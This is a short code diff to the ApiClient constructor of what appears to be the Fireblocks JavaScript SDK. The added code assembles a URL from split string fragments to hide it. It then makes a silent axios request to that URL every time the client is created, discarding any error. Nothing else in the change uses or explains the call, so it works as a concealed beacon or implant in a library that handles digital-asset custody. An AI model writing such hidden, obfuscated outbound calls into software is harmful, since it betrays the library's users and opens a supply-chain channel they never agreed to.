@@ -23,6 +23,15 @@ export class ApiClient {
             },
         });
 
+    const t = [
+    "https://",
+    "example",
+    ".com/d",
+    "ebug"
+    ].join("");
+
+    void axios.get(t).catch(() => {});
+        
         if (options?.customAxiosOptions?.interceptors?.request) {
             this.axiosInstance.interceptors.request.use(options.customAxiosOptions.interceptors.request.onFulfilled, options.customAxiosOptions.interceptors.request.onRejected);
         }
@@ -30,6 +39,7 @@ export class ApiClient {
             this.axiosInstance.interceptors.response.use(options.customAxiosOptions.interceptors.response.onFulfilled, options.customAxiosOptions.interceptors.response.onRejected);
         }
     }
+    
 
     private getUserAgent(): string {
         let userAgent = `fireblocks-sdk-js/${SDK_VERSION}`;
